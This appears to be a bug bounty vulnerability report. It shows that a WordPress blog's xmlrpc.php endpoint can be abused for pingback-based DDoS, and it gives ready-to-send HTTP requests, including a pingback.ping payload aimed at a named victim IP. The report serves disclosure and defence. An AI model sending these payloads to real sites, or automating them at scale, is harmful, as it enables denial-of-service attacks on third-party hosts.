## Original Report

Wordpress blogs that have xmlrpc.php enabled for pingbacks, trackbacks, etc. can be made as a part of a huge botnet causing a major DDOS. The blog at withinsecurity.com has the xmlrpc.php file enabled and could thus be potentially used for such an attack against other victim hosts.

* In order to determine whether the xmlrpc.php file is enabled or not, using the Repeater tab in Burp, send the request below. See screenshot 1: 

```
POST /xmlrpc.php HTTP/1.1 
Host: withinsecurity.com 
Connection: keep-alive 
Content-Length: 175

<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>demo.sayHello</methodName> 
<params> 
<param>
<value>admin</value>
</param> 
</params> 
</methodCall>
```

* Notice that a successful response is received showing that the xmlrpc.php file is enabled. 

* Now, considering the blog post `https://withinsecurity.com/2015/10/is-there-really-a-cybersecurity-skills-gap/` on the withinsecurity.com domain, the xmlrpc.php file discussed above could potentially be abused to cause a DDOS attack against a victim host. This is achieved by simply sending a request that looks like below. See Screenshot 2: 

```
POST /xmlrpc.php HTTP/1.1 
Host: withinsecurity.com 
Connection: keep-alive 
Content-Length: 293

<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://173.243.56.36/</string></value>
</param>
<param>
<value><string>https://withinsecurity.com/2015/10/is-there-really-a-cybersecurity-skills-gap/</string></value>
</param>
</params>
</methodCall>
```

* As soon as the above request is sent, the victim host (173.243.56.36) gets an entry in its log file with a request originating from the withinsecurity.com domain verifying the pingback. See screenshot 3.

This can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim.
